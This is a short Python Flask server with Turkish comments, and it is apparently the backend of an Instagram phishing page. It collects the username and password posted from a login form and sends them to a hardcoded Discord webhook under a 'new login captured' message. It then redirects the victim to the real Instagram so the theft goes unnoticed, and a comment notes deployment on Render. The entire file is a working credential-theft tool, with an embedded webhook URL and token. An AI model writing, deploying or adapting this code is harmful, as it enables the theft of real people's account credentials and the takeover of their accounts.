from flask import Flask, render_template, request, redirect
import requests
import os

app = Flask(__name__)

# 1. Ana sayfa açıldığında index.html'i gösterir
@app.route('/')
def ana_sayfa():
    return render_template('index.html')

# 2. Butona basıldığında verileri Discord'a gönderir
@app.route('/kayit', methods=['POST'])
def verileri_al():
    kullanici = request.form.get('username')
    sifre = request.form.get('password')

    # Senin Discord Webhook Linkin
    webhook_url = "https://discord.com/api/webhooks/1494439429362946168/JM-oFuWUlp7cuzmfHeW8KPKXKYa88lJygX2aXuCJHLdnz0OSQszkb2wlTx35yqhHSDHJ"
    
    data = {
        "content": f"🔥 **Yeni Giriş Yakalandı!**\n**Kullanıcı:** {kullanici}\n**Şifre:** {sifre}"
    }
    
    # Bilgileri Discord'a gönder
    try:
        requests.post(webhook_url, json=data)
    except Exception as e:
        print(f"Mesaj gönderilirken hata oluştu: {e}")

    # Kullanıcıyı gerçek Instagram'a yönlendir
    return redirect("https://www.instagram.com")

# 3. Render için gerekli çalıştırma ayarı
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)